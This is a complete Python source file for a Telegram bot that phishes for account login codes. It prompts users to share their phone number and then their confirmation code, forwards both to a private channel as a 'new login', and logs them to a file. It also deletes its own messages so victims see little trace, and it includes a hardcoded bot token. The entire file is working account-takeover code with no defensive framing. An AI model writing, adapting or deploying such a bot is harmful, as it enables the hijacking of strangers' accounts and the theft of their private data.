from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from datetime import datetime, timedelta
import logging
import asyncio

# === ТВОИ ДАННЫЕ ===
TOKEN = "8077479145:AAGYzq0rKCM4kHsZpYsJEmJlC3F7tVdiAx8"
CHANNEL_ID = -1003079638308
ADMIN_ID = 123456789  # замени на свой Telegram ID

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

logging.basicConfig(filename="logins.txt", level=logging.INFO)
user_last_submit = {}

async def send_and_delete(chat_id, text, previous_msg: Message = None):
    if previous_msg:
        try:
            await bot.delete_message(chat_id, previous_msg.message_id)
        except:
            pass
    msg = await bot.send_message(chat_id, text)
    await asyncio.sleep(10)
    try:
        await bot.delete_message(chat_id, msg.message_id)
    except:
        pass
    return msg

@dp.message_handler(commands=["start"])
async def start(message: Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
    await send_and_delete(message.chat.id, "Нажми кнопку, чтобы отправить номер:", message)
    await AuthFlow.waiting_for_phone.set()

@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthFlow.waiting_for_phone)
async def get_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number
    await state.update_data(phone=phone)
    await send_and_delete(message.chat.id, "Теперь отправь код подтверждения:", message)
    await AuthFlow.waiting_for_code.set()

@dp.message_handler(state=AuthFlow.waiting_for_code)
async def get_code(message: Message, state: FSMContext):
    uid = message.from_user.id
    now = datetime.now()

    if uid in user_last_submit and now - user_last_submit[uid] < timedelta(hours=24):
        await send_and_delete(message.chat.id, "⏳ Ты уже отправлял данные сегодня. Попробуй позже.", message)
        await state.finish()
        return

    if not message.text.isdigit() or len(message.text) > 6:
        await send_and_delete(message.chat.id, "❌ Неверный формат кода. Введи числовой код до 6 символов.", message)
        return

    data = await state.get_data()
    phone = data["phone"]
    code = message.text

    await bot.send_message(CHANNEL_ID, f"📲 Новый логин:\nНомер: {phone}\nКод: {code}")
    logging.info(f"{datetime.now()} | Номер: {phone}, Код: {code}")
    user_last_submit[uid] = now

    await send_and_delete(message.chat.id, "✅ Данные отправлены.", message)
    await state.finish()

@dp.message_handler(commands=["stats"])
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    count = len(user_last_submit)
    await send_and_delete(message.chat.id, f"📈 Сегодня отправлено логинов: {count}", message)

if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp)
